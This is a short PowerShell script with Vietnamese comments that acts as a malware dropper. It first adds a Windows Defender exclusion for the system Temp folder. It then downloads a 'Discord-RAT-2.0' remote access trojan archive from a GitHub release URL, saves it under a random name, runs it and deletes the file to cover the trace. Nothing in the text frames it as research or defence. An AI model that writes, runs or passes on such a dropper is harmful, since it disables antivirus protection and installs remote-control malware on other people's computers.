Add-MpPreference -ExclusionPath "C:\Windows\Temp"
$ErrorActionPreference = "Stop"
# Bật TLSv1.2 để tương thích với các phiên bản cũ hơn
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://github.com/moom825/Discord-RAT-2.0/releases/download/2.0/release.zip'
$DownloadURL2 = 'https://github.com/moom825/Discord-RAT-2.0/releases/download/2.0/release.zip'

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\release_$rand.zip" } else { "$env:TEMP\release_$rand.zip" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    try {
        $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
    }
    catch {
        Write-Host "Không thể tải xuống tệp ZIP."
        exit 1
    }
}

# Chỉ lưu nội dung của phản hồi vào tệp
Set-Content -Path $FilePath -Value $response.Content

# Thực thi tệp kịch bản đã tải về
Start-Process $FilePath -Wait

# Xóa tệp ZIP đã tải về
Remove-Item $FilePath
